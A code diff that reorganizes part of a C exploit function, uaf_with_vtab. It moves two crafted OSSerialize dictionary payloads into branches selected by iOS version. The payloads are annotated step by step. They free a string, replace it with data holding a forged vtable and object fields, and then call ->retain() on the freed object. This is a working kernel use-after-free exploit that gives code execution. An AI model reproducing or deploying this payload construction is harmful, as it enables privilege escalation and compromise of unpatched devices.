@@ -67,72 +67,6 @@ void uaf_with_vtab(addr_t addr)
     uint32_t *data = (uint32_t*)&osstr;
     const char str[4] = "str",
                ref[4] = "ref";
-    uint32_t
-    dict_92[8 + sizeof(OSString) / sizeof(uint32_t)] =
-    {
-        kOSSerializeMagic,                                              // Magic
-        kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries
-
-        kOSSerializeString | 4,                                         // String that'll get freed
-        *((uint32_t*)str),
-        kOSSerializeData | sizeof(OSString),                            // OSData that will replace our string
-#ifdef __LP64__
-        data[0],                                                        // vtable (lower half)
-        data[1],                                                        // vtable (upper half)
-        data[2],                                                        // retainCount
-        data[3],                                                        // flags
-        data[4],                                                        // length
-        data[5],                                                        // (padding)
-        data[6],                                                        // string pointer (lower half)
-        data[7],                                                        // string pointer (upper half)
-#else
-        data[0],                                                        // vtable
-        data[1],                                                        // retainCount
-        data[2],                                                        // flags
-        data[3],                                                        // length
-        data[4],                                                        // string pointer
-#endif
-
-        kOSSerializeSymbol | 4,                                         // Just a name
-        *((uint32_t*)ref),
-        kOSSerializeEndCollection | kOSSerializeObject | 1,             // Call ->retain() on the freed string
-    },
-    dict_90[13 + sizeof(OSString) / sizeof(uint32_t)] =
-    {
-        kOSSerializeMagic,                                              // Magic
-        kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries
-
-        kOSSerializeSymbol | 4,                                         // Just a name
-        *((uint32_t*)str),
-        kOSSerializeString | 4,                                         // String that'll get freed
-        *((uint32_t*)str),
-
-        kOSSerializeObject | 1,                                         // Same name as before
-        kOSSerializeBoolean | 1,                                        // Whatever value
-
-        kOSSerializeObject | 1,                                         // Same name again
-        kOSSerializeData | sizeof(OSString),                            // OSData that will replace our string
-#ifdef __LP64__
-        data[0],                                                        // vtable (lower half)
-        data[1],                                                        // vtable (upper half)
-        data[2],                                                        // retainCount
-        data[3],                                                        // flags
-        data[4],                                                        // length
-        data[5],                                                        // (padding)
-        data[6],                                                        // string pointer (lower half)
-        data[7],                                                        // string pointer (upper half)
-#else
-        data[0],                                                        // vtable
-        data[1],                                                        // retainCount
-        data[2],                                                        // flags
-        data[3],                                                        // length
-        data[4],                                                        // string pointer
-#endif
-
-        kOSSerializeSymbol | 4,                                         // Just a name
-        *((uint32_t*)ref),
-        kOSSerializeEndCollection | kOSSerializeObject | 2,             // Call ->retain() on the freed string
-    };
 
     print_info();
 
@@ -140,10 +74,77 @@ void uaf_with_vtab(addr_t addr)
 
     if(get_os_version() >= V_13C75) // 9.2
     {
+        uint32_t dict_92[8 + sizeof(OSString) / sizeof(uint32_t)] =
+        {
+            kOSSerializeMagic,                                              // Magic
+            kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries
+
+            kOSSerializeString | 4,                                         // String that'll get freed
+            *((uint32_t*)str),
+            kOSSerializeData | sizeof(OSString),                            // OSData that will replace our string
+    #ifdef __LP64__
+            data[0],                                                        // vtable (lower half)
+            data[1],                                                        // vtable (upper half)
+            data[2],                                                        // retainCount
+            data[3],                                                        // flags
+            data[4],                                                        // length
+            data[5],                                                        // (padding)
+            data[6],                                                        // string pointer (lower half)
+            data[7],                                                        // string pointer (upper half)
+    #else
+            data[0],                                                        // vtable
+            data[1],                                                        // retainCount
+            data[2],                                                        // flags
+            data[3],                                                        // length
+            data[4],                                                        // string pointer
+    #endif
+
+            kOSSerializeSymbol | 4,                                         // Just a name
+            *((uint32_t*)ref),
+            kOSSerializeEndCollection | kOSSerializeObject | 1,             // Call ->retain() on the freed string
+        };
+
         dict_parse(dict_92, sizeof(dict_92));
     }
     else
     {
+        uint32_t dict_90[13 + sizeof(OSString) / sizeof(uint32_t)] =
+        {
+            kOSSerializeMagic,                                              // Magic
+            kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries
+
+            kOSSerializeSymbol | 4,                                         // Just a name
+            *((uint32_t*)str),
+            kOSSerializeString | 4,                                         // String that'll get freed
+            *((uint32_t*)str),
+
+            kOSSerializeObject | 1,                                         // Same name as before
+            kOSSerializeBoolean | 1,                                        // Whatever value
+
+            kOSSerializeObject | 1,                                         // Same name again
+            kOSSerializeData | sizeof(OSString),                            // OSData that will replace our string
+    #ifdef __LP64__
+            data[0],                                                        // vtable (lower half)
+            data[1],                                                        // vtable (upper half)
+            data[2],                                                        // retainCount
+            data[3],                                                        // flags
+            data[4],                                                        // length
+            data[5],                                                        // (padding)
+            data[6],                                                        // string pointer (lower half)
+            data[7],                                                        // string pointer (upper half)
+    #else
+            data[0],                                                        // vtable
+            data[1],                                                        // retainCount
+            data[2],                                                        // flags
+            data[3],                                                        // length
+            data[4],                                                        // string pointer
+    #endif
+
+            kOSSerializeSymbol | 4,                                         // Just a name
+            *((uint32_t*)ref),
+            kOSSerializeEndCollection | kOSSerializeObject | 2,             // Call ->retain() on the freed string
+        };
+
         dict_parse(dict_90, sizeof(dict_90));
     }
     // Write everything to disk
